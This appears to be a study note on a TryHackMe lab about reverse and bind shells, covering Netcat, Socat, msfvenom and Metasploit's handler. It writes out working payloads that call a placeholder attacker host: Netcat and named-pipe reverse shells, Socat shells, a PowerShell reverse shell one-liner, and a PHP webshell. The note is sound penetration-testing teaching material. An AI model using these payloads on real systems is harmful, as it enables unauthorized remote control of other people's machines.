---
title: What the shell?
desc: >-
  THM: An introduction to sending and receiving (reverse/bind) shells when
  exploiting target machines.
---
## Additional Resources
- [Payloads All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)


## Task 1 - What is a shell?
In its simplest form, shells are what we use when interfacing with a Command Line environment (CLI). The common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows.

## Task 2 - Tools
There are a variety of tools that can be used to receive reverse shells and to send bind shells.

### Netcat
Netcat is the "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, receive reverse shells, and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable by default but there are techniques to stabalize the shell (more below).

### Socat
Socat is essentially Netcat on steroids. It can do everything Netcat can and much more. Socat shells are usually more stable out of the box. It should be noted that when compared to Netcat:
- Socat's syntax is more difficult.
- Netcat is installed on virtually every Linux distro by default while Socat is rarely installed by default.

### Metasploit - multi/handler
The `auxiliar/multi/handler` module of Metasploit Framework is used to receive reverse shells. Due to being part of Metasploit Framework, multi/handler provides a fully-fledged way to obtain stable shells. It is also the only way to interact with a Meterpreter shell and is the easiest way to handle staged payloads.

### Msfvenom
Like multi/handler, msfvenom is technically part of the Metasploit Framework but is shipped as a standalone tool and can be used to generate payloads on the fly.

### Other Tools
Beside the tools listed above, there are repositories of shells in many different programming languages. Two of the most prominent are [Payloads All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Online generators such as [Reverse Shell Generator](https://www.revshells.com/) can make generating code for shells a trivial task.

Kali also comes pre-installed with a variety of webshells located at `/usr/share/webshells` and `/usr/share/seclists/Web-Shells`.

## Task 3 - Types of Shell
The following are two types of shells which are useful when exploiting a target:
- **Reverse Shells**: Require the remote target to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target. The main drawback to reverse shells is that when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell (ie: port forwarding).
- **Bind Shells**: Requires the remote target to execute code to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network but may be prevented by firewalls protecting the target. Note that port forwarding on the remote host would be required when connecting to the shell from the internet.

As a general rule, reverse shells are easier to execute and debug.

Shells can be either interactive or non-interactive:
- **Interactive Shells**: These shells allow you to interact with programs after executing them.
- **Non-Interactive Shells**: In these shells you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, majority of simple reverse and bind shells are non-interactive.

## Task 4 - Netcat
Netcat is the most basic took in a pentester's toolkit.

### Reverse Shells
There are many ways to execute a shell. Let's start by looking at listeners. The syntax for starting a Netcat listener using Linux is as follows:

```console
nc -lvnp <port-number>

# -l is used to tell Netcat that this will be a listener.
# -v is used to request a verbose output.
# -n tells Netcat not to resolve host names or use DNS.
# -p indicates that the port specification will follow.
```
Note that if you use a port number below 1024, you will need to use `sudo` when starting the listener. It is generally a good idea to use a well-known port number (80, 443, or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

### Bind Shells
A bind shell on a target requires that there is already a listener waiting on a chosen port of the target. All we need to do is then connect to it. The syntax for this is as follows:

```console
nc <target-ip> <chosen-port>
```
Here we are using Netcat to make an outbound connection to the target on our chosen port.

## Task 5 - Netcat Shell Stabilization
As mentioned previously, Netcat shells are unstable by default. These shells are non-interactive and often have formatting errors. This is due to Netcat shells being processes running inside a terminal. There are many ways to stabilize Netcat shells on Linux systems. Let's look at three common techniques.

### Python
Most Linux machines typically have Python installed by default. This is three stage process:
1. Use `python -c 'import pty;pty.spawn("/bin/bash")`, which uses Python to spawn a better featured bash shell. At this point our shell will look a little "prettier" but we won't be able to use TAB autocomplete or the arrow keys. CTRL+C will kill the shell.
2. Use `export TERM=xterm`. This will give us access to term commands such as `clear`.
3. Finally, background the shell using CTRL+Z. Back in our own terminal use `stty raw -echo; fg`. This turns off our own terminal echo (which gives us access to tab autocomplete, arrow keys, and CTRL+C to kill processes). It then foregrounds the remote shell thereby completing the process.

See [[cheatsheets.shellstabilisation]].

Note that if the shell dies or the session is closed, any input in your own terminal will not be visible due to the `-echo` command. To fix this, simply type `reset` and press the ENTER key.

### rlwrap
rlwrap is a program which gives us access to history, TAB autocomplete and arrow keys immediately upon receiving a shell. Some manual stabilization is still required to use CTRL+C inside the shell though.

rlwrap is not installed by default on Linux and needs to be installed using the packet manager for the distribution (ie: `sudo apt install rlwrap`).

To use wlwrap, the listener needs to be invoked as follows:

```console
rlwrap nc -lvnp <port-number>
```
By prepending our Netcat listener with "rlwrap", we are able to receive a more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise very difficult to stabilize.

### Socat
The third easiest way to stabilize a shell is to quite simply use an initial Netcat shell as a stepping stone into a more fully-featured Socat shell.

Note that this technique is limited to Linux targets only as Socat on Windows is as unstable as a Netcat shell.

We utilize this, we are required to first transfer a [Socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) onto the target machine. A Python HTTP server can be used to host the file. The Netcat shell on the target can then be used to download the file.

## Task 6 - Socat
The easiest way to thing about Socat is as a connector between two points. All Socat does is provide a link between two points.

### Reverse Shells
The following is the syntax for a basic reverse shell listener in Socat:

```console
Socat TCP-L:<port-number> -
```
On Windows, the command to connect back is as follows:

```console
socat TCP:<Local-IP>:<Local-Port> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force Powershell (or cmd.exe) to use Unix style standard input and output.

The equivalent command for a Linux target is as follows:

```console
socat TCP:<Local-IP>:<Local-Port> EXEC:"bash -li"
```
The above commands are for very basic Socat listeners and payloads. A more advanced listener and payload can be setup when targeting a Linux machine with the following syntax:

```console
socat TCP-L:<Port-Number> FILE:`tty`,raw,echo=0
```
In the above listener command, we are passing in the current TTY as a file and setting the echo to be zero. This is similar to using CTRL+Z,`stty raw -echo; fg` trick with Netcat shells but with the added bonus of being able to immediately stabilize and hook into a full TTY.

The advanced listener can be connected with any payload; however, the following payload is very useful when targeting Linux machines:

```console
socat TCP:<Attacker-IP>:<Attacker-Port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# - pty: allocates a pseudo-terminal on the target.
# - stderr: makes sure that any error messages get shown in the shell.
# - sigint: passes any CTRL+C commands through into the sub-process.
# - setsid: creates the process in a new session.
# - sane: stabilizes the terminal attempting to "normalize" it.
```

### Bind Shells
On a Linux target, we would use the following command to create a bind shell:

```console
socat TCP-L:<Port-Number> EXEC:"bash -li"
```
On a Windows target, we would use the following command to create a bind shell:

```console
socat TCP-L:<Port-Number> EXEC:powershell.exe,pipes
```
Regardless of the target, we use the following command on the attacking machine to connect to the waiting listener:

```console
socat TCP:<Target-IP>:<Target-Port> -
```
## Task 7 - Socat Encrypted Shells
One of the many good things about Socat is that it's capable of creating both bind and reverse encrypted shells. To allow for encrypted shells, we first need to generate an SSL certificate. This can be done using OpenSSL which comes installed default on Linux machines with the following syntax:

```console
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for 362 days. When we run this command it will ask us to fill in information about the certificate. This can be left blank, or filled randomly.

Now we need to merge the two files created by OpenSSL together into a single `.pem` file.

```console
cat shell.key shell.crt > shell.pem
```
With the `.pem` file created, we can now set up our reverse shell listener with the following command:

```console
socat OPENSSL-LISTEN:<Port-Number>,cert=shell.pem,verify=0 -
```
This sets up an OPENSSL listener using our generated certificate. The `verify=0` tells the connection to not bother trying to validate if our certificate has been properly signed by a recognized authority.

Note that the certificate must be used on whichever device is listening.

To connect back (ie: payload), the following command can be used:

```cosole
socat OPENSSL:<Attacker-IP>:<Attacker-Port>,verify=0 EXEC:/bin/bash
```
For bind shells, the same technique would apply:

```console
# Target Machine (Windows Example)

socat OPENSSL-LISTEN:<Port-Number>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Attacker Machine

socat OPENSSL:<Target-IP>:<Target-PORT>,verify=0 -
```
Note that the certificate must be copied over to the target machine prior to creating a bind listener.

## Task 8 - Common Shell Payloads
This tasks covers some common payloads using the tools we have already discussed above.

A simple Netcat payload can be made as follows:

```console
# Bind Shell Listener
nc -lvnp <Port-Number> -e /bin/bash

# Reverse Shell Payload
nc <Attacker-IP> <Attacker-Port> -e /bin/bash
```
If the target is not using `netcat-traditional` we will not be able to use the above commands. In this event the following commands using named pipes will prove useful:

```console
# Bind Shell Listener
mkfifo /tmp/f; nc -lvnp <Port-Number> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Reverse Shell Payload
mkfifo /tmp/f; nc <Attacker-IP> <Attacker-Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
When targeting Windows systems, a Powershell one liner can be very useful.

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<Attacker-IP>',<Attacker-Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Multitude of payloads can be generated for both Linux and Windows at: [Reverse Shell Generator](https://www.revshells.com/)

## Task 9 - Msfvenom
Msvenom is considered the one-stop-shop for all things payload related. Being part of the Metasploit Framework, Msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hex shellcode when developing something like a Buffer Overflow exploit.

The standard syntax for Msfvenom is as follows:

```console
msfvenom -p <PAYLOAD> <OPTIONS>
```
Various payloads can be listed using the command `--list-payloads`. All relevant options can be listed using the `-h` syntax.

### Staged vs Stageless
- **Staged payloads** are sent in two parts. The first part is called the *stager*. This is a piece of code which is executed directly on the target itself. It then connects back to a waiting listener and downloads the real payload; executing it in memory without the payload every touching the disk. Staged payloads require a special listener (usually multi/handler).
- **Stageless payloads** are more common. These are self-contained in that there is only one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to catch and use. They are larger in size and easier for an antivirus or IDS/IPS to discover and remove.

Modern day antivirus solutions make use of the Anti-Malware Scan Interface (AMSI) to detect payloads as they are loaded into memory by a stager. This makes staged payloads less effective then they once were.

## Task 10 - Metasploit multi/handler
Multi/handler is an excellent tool for catching reverse shells. It is essential if you want to use Meterpreter shells.

To use multi/handler, open Metasploit Framework using `msfvonsole` and type `use multi/handler`.

multi/handler defaults to a `generic/shell_reverse_tcp` payload so depending on what payload was selected, this may need to be modified using the `set payload <PAYLOAD>` command. Listing options using the `options` command shows all the options (including the required options necessary for the module to function).

## Task 11 - WebShells
Webshell is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage (either through an HTML form or directly as arguments in the URL) which are then executed by the script. The results are returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's look at an example code for this.

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
This will take a GET parameter in the URL and execute it on the system with `shell_exec()` command. Essentially, what this means is that any command we enter in the URL after `?cmd=` will be executed on the system. The "pre" elements are there to ensure that the results are formatted correctly on the page.

## Tasks 12-15
Tasks 12-15 cover practical hands-on practice of the different shell techniques discussed in this room.
